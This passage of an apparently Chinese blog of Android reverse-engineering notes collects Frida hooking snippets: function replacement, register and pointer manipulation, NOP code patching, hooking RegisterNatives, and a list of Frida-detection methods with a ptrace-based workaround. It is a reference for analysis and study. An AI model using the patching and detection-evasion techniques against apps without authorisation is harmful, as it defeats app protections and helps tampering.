class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_Interceptor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">       <span class="comment">//这个c_getSum方法有两个int参数、返回结果为两个参数相加</span></span><br><span class="line">       <span class="comment">//这里用NativeFunction函数自己定义了一个c_getSum函数</span></span><br><span class="line">       <span class="keyword">var</span> add_method = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&#x27;libhello.so&#x27;</span>, <span class="string">&#x27;c_getSum&#x27;</span>), </span><br><span class="line">       <span class="string">&#x27;int&#x27;</span>,[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line">       <span class="comment">//输出结果 那结果肯定就是 3</span></span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result:&quot;</span>,<span class="title function_">add_method</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">       <span class="comment">//这里对原函数的功能进行替换实现</span></span><br><span class="line">       <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(add_method, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">           <span class="comment">//h不论是什么参数都返回123</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">       &#125;, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]));</span><br><span class="line">       <span class="comment">//再次调用 则返回123</span></span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result:&quot;</span>,<span class="title function_">add_method</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="writePointer-ptr">writePointer(ptr)</h2><p>读取ptr指针地址到当前指针</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//先打印pointer指针地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pointer :&quot;</span>+pointer);</span><br><span class="line"><span class="comment">//分配四个字节的空间地址</span></span><br><span class="line"><span class="keyword">const</span> r = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">4</span>);</span><br><span class="line"><span class="comment">//将pointer指针写入刚刚申请的r内</span></span><br><span class="line">r.<span class="title function_">writePointer</span>(pointer);</span><br><span class="line"><span class="comment">//读取r指针的数据</span></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="title class_">Memory</span>.<span class="title function_">readByteArray</span>(r, <span class="number">4</span>);</span><br><span class="line"><span class="comment">//r指针内放的pointer指针地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buffer);</span><br><span class="line"></span><br><span class="line">输出如下。</span><br><span class="line"><span class="comment">//console.log(&quot;pointer :&quot;+pointer); 这句打印的地址 也就是libc的地址</span></span><br><span class="line">pointer :<span class="number">0xf588f000</span></span><br><span class="line"><span class="comment">//console.log(buffer); 输出buffer 0xf588f000在内存数据会以00 f0 88 f5方式显示</span></span><br><span class="line">           <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span>  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00</span> f0 <span class="number">88</span> f5              </span><br></pre></td></tr></table></figure><h2 id="readPointer">readPointer()</h2><p>从此内存位置读取<code>NativePointer</code>，示例代码如下。省略<code>function</code>以及<code>Java.perform</code>~</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pointer = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libc.so&quot;</span>).<span class="property">base</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pointer.<span class="title function_">readByteArray</span>(<span class="number">0x10</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;readPointer():&quot;</span>+pointer.<span class="title function_">readPointer</span>());</span><br><span class="line">输出如下。</span><br><span class="line"><span class="title function_">readPointer</span>():<span class="number">0x464c457f</span></span><br><span class="line"></span><br><span class="line">也就是将readPointer的前四个字节的内容转成地址产生一个新的<span class="title class_">NativePointer</span>。</span><br></pre></td></tr></table></figure><h2 id="Frida-API-写文件">Frida API 写文件</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest12</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> ios = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/sdcard/a.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    ios.<span class="title function_">write</span>(<span class="string">&quot;asdfg\n&quot;</span>);</span><br><span class="line">    ios.<span class="title function_">flush</span>();</span><br><span class="line">    ios.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook-libc-so-写文件">Hook <a href="http://libc.so">libc.so</a> 写文件</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest13</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">//获得libc中导出函数地址 </span></span><br><span class="line">    <span class="keyword">var</span> addr_fopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> addr_fputs = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fputs&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> addr_fclose = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fclose&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addr_fopen:&quot;</span>, addr_fopen, <span class="string">&quot;addr_fputs:&quot;</span>, addr_fputs, <span class="string">&quot;addr_fclose:&quot;</span>, addr_fclose);</span><br><span class="line">    <span class="keyword">var</span> fopen = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fopen, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">    <span class="keyword">var</span> fputs = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fputs, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">    <span class="keyword">var</span> fclose = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_fclose, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> filename = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;/sdcard/a.txt&quot;</span>); <span class="comment">//定义一个so 字符串 文件名</span></span><br><span class="line">    <span class="keyword">var</span> open_mode = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> file = <span class="title function_">fopen</span>(filename, open_mode);  <span class="comment">//文件句柄</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fopen:&quot;</span>, file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> buffer = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;asd\n&quot;</span>); <span class="comment">//写的内容</span></span><br><span class="line">    <span class="keyword">var</span> retval = <span class="title function_">fputs</span>(buffer, file);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fputs:&quot;</span>, retval);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">fclose</span>(file);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="inlineHook与寄存器Hook">inlineHook与寄存器Hook</h2><p>arm64中 结果放在x0中， w0是x0的低32位   inlinehook在64位下比较稳定</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest14</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">    <span class="keyword">var</span> sub_2894 = soAddr.<span class="title function_">add</span>(<span class="number">0x2894</span>); <span class="comment">//函数地址计算 thumb+1 ARM不加</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sub_2894);</span><br><span class="line">    <span class="keyword">if</span>(sub_2894 != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_2894,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span>.<span class="title function_">toInt32</span>());</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span> = <span class="number">0x1000</span>;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span>.<span class="title function_">toInt32</span>());</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sub_2858 = soAddr.<span class="title function_">add</span>(<span class="number">0x2858</span>); <span class="comment">//函数地址计算 thumb+1 ARM不加</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sub_2858);</span><br><span class="line">    <span class="keyword">if</span>(sub_2858 != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_2858,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x1</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x1</span> = soAddr.<span class="title function_">add</span>(<span class="number">0x2C35</span>); <span class="comment">//让这个指针参数指向另一个字符串地址</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x1</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="frida进行内存nop">frida进行内存nop</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//32位Thumb</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">nop</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(<span class="title function_">ptr</span>(addr), <span class="number">4</span>, <span class="function"><span class="params">code</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> cw = <span class="keyword">new</span> <span class="title class_">ThumbWriter</span>(code, &#123; <span class="attr">pc</span>: <span class="title function_">ptr</span>(addr) &#125;);</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">flush</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//64位</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">nop</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(<span class="title function_">ptr</span>(addr), <span class="number">4</span>,</span><br><span class="line">            <span class="function"><span class="params">code</span>=&gt;</span>  &#123;</span><br><span class="line">        <span class="keyword">const</span> cw = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(code, &#123; <span class="attr">pc</span>: <span class="title function_">ptr</span>(addr) &#125;);</span><br><span class="line">        <span class="comment">// const cw = new ThumbWriter(code, &#123; pc: ptr(addr) &#125;);</span></span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">putNop</span>();</span><br><span class="line">        cw.<span class="title function_">flush</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="native层调用栈打印">native层调用栈打印</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(f, &#123;</span><br><span class="line">  <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;RegisterNatives called from:\n&#x27;</span> +</span><br><span class="line">        <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>) <span class="comment">// 或者Backtracer.FUZZY</span></span><br><span class="line">        .<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&#x27;\n&#x27;</span>) + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Hook-RegisterNative">Hook RegisterNative</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_libart</span>(<span class="params"></span>) &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> module_libart = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>);</span><br><span class="line">    <span class="comment">//枚举所有的文件来找到</span></span><br><span class="line">    <span class="comment">//首先找到so</span></span><br><span class="line">    <span class="keyword">var</span> symbols = module_libart.<span class="title function_">enumerateSymbols</span>();   </span><br><span class="line">     <span class="comment">//枚举模块的符号</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> addr_RegisterNatives = <span class="literal">null</span>;      </span><br><span class="line">     <span class="comment">// 怎么hook RegisterNatives</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbols.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> name = symbols[i].<span class="property">name</span>;</span><br><span class="line">        <span class="keyword">if</span> (name.<span class="title function_">indexOf</span>(<span class="string">&quot;art&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((name.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span>) &amp;&amp; (name.<span class="title function_">indexOf</span>(<span class="string">&quot;JNI&quot;</span>) &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">                 <span class="keyword">if</span> (name.<span class="title function_">indexOf</span>(<span class="string">&quot;RegisterNatives&quot;</span>) &gt;= <span class="number">0</span>) &#123;<span class="comment">//找到函数的名字</span></span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">                    addr_RegisterNatives = symbols[i].<span class="property">address</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (addr_RegisterNatives) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr_RegisterNatives, &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addr_RegisterNatives name:&quot;</span>, <span class="title function_">ptr</span>(args[<span class="number">2</span>]).<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>())</span><br><span class="line">                <span class="comment">//因为RegisterNatives函数的第三个参数的类型是指针类型，所以要先ptr().readPointer()再读取其中的值</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addr_RegisterNatives sig:&quot;</span>, <span class="title function_">ptr</span>(args[<span class="number">2</span>]).<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span>).<span class="title function_">readPointer</span>().<span class="title function_">readCString</span>());</span><br><span class="line">                <span class="comment">//增加一个指针的长度，也就是我们刚刚分析过程中加密的那一段字符串的值，</span></span><br><span class="line">                <span class="comment">//注意一下这里不是第四个参数，因为这里是一个指针，首先指向了第三个参数的地址，然后从第三个参数的那片内存区域中增加了8个长度，也就是刚刚那段加密的字符串</span></span><br><span class="line">            &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>一些hook方法补充</h1><p>byte array to String</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法一</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">JavaString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"><span class="title class_">JavaString</span>.$new(<span class="string">&#x27;byte array&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">ByteString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);</span><br><span class="line"><span class="comment">// 转成 hex 在转 string</span></span><br><span class="line"><span class="title class_">ByteString</span>.<span class="title function_">of</span>(<span class="string">&#x27;byte array&#x27;</span>).<span class="title function_">hex</span>();<span class="comment">//utf8()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出Java.choose()中存在的实例</span></span><br><span class="line"><span class="title function_">getObjClassName</span>(instance) </span><br><span class="line"></span><br><span class="line"><span class="comment">//frida可以通过$className打印类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//打印当前线程id</span></span><br><span class="line"><span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>当参数是list时</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打印这个参数</span></span><br><span class="line"><span class="keyword">var</span> arrays = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.util.Arrays&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;content: &#x27;</span> + arrays.<span class="title function_">toString</span>(args.<span class="title function_">toArray</span>()));</span><br></pre></td></tr></table></figure><p><strong>frida中实现 官方的保存图片方法</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> path=<span class="string">&quot;/sdcard/Download/tmp/&quot;</span>+<span class="title function_">guid</span>()+<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> file = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.File&quot;</span>).$new(path);</span><br><span class="line"><span class="keyword">var</span> fos = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(file);</span><br><span class="line"><span class="title class_">Bitmap</span>_Obj.<span class="title function_">compress</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.graphics.Bitmap$CompressFormat&quot;</span>).<span class="property">JPEG</span>.<span class="property">value</span>,<span class="number">100</span>,fos);</span><br><span class="line">fos.<span class="title function_">flush</span>();</span><br><span class="line">fos.<span class="title function_">close</span>();</span><br></pre></td></tr></table></figure><p><strong>hextobytes</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBytes</span>(<span class="params">hex</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> bytes = [], c = <span class="number">0</span>; c &lt; hex.<span class="property">length</span>; c += <span class="number">2</span>)</span><br><span class="line">        bytes.<span class="title function_">push</span>(<span class="built_in">parseInt</span>(hex.<span class="title function_">substr</span>(c, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br></pre></td></tr></table></figure><h1>frida Stalker Trace</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Stalker<span class="selector-class">.follow</span>(<span class="selector-attr">[threadId, options]</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>frida检测</h1><p>–b站 《Frida特征检测之高维对抗节》</p><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1921073">《安卓逆向这档事》十八、表哥，你也不想你的Frida被检测吧!(上) - 吾爱破解 - 52pojie.cn</a></p><p><strong>r0trace</strong>：安卓Java层多功能追踪脚本</p><p>几种检测方法：</p><ul><li>Frida端口扫描 及关键文件/data/local/tmp下是否有frdia-server</li><li>线程检测</li><li>Maps记录检查 进入进程号路径后 cat Maps。frida注入后maps文件下会有frida-agent-64.so<code>、</code>frida-agent-32.so等文件</li><li>fd检测 进程名路径下 cd fd，cat 0<br>/proc/pid/fd 目录的作用在于提供了一种方便的方式来查看进程的文件描述符信息，这对于调试和监控进程非常有用。通过查看文件描述符信息，可以了解进程打开了哪些文件、网络连接等，帮助开发者和系统管理员进行问题排查和分析工作。</li><li>Trace状态检测  进入进程号路径后 cat status 当然status可能也有frida特征信息，如gmain、pool-frida、gdbus</li><li>内存特征检测</li><li>对frida的检测通常会使用openat、open、strstr、pthread_create、snprintf、sprintf、readlinkat等一系列函数，</li><li>ptrace占坑位，当app主动附加自身进程时，注入就会提示<code>run frida as root</code>这是因为一个进程只能<code>ptrace一次 执行frida -U -f 包名 -l xxx.js</code>即可绕过</li><li>fridaserver使用<strong>D-Bus检测</strong>，D-Bus是一种进程通信机制，通过遍历端口进行socket连接，如果成功则有开放端口，然后看看响应是不是“REJECT”，是则开启frida服务器（一般来讲如果出现一个App启动后过了一会就退出那么就有可能是这种检测方案。）可以遍历/proc/net/tcp文件，或者直接从0-65535向每个开放的端口发送D-bus认证消息，哪个端口回复了REJECT，就是frida-server</li><li>进程名检测，查看是否有frida相关，如fridaserver，但是高版本安卓这个检测无效</li><li>frida-server启动后<code>/proc/net/tcp</code>和<code>/proc/net/tcp6</code>中会有特殊标识:69a2，可以通过搜索tcp中的字符串来检测frida是否启动</li><li>/proc/self/attr/prev 文件若是u:r:zygote:s0，则有用面具的magisk zygisk模块</li><li>proc/pid/status的TracePid值 ==》 proc/pid2/cmdline查看调试器进程名</li></ul><h3 id="追踪监测点"><strong>追踪监测点</strong></h3><ol><li><p>使用r0trace看调用的java层函数</p></li><li><p>hook dlopen函数，加载so文件 一般断在哪里哪里就有可能有frida检测</p><p>可以直接js脚本hook dlopen或者使用frida-trace 找到目标so然后进行分析</p><p><code>frida-trace -U -f package -i 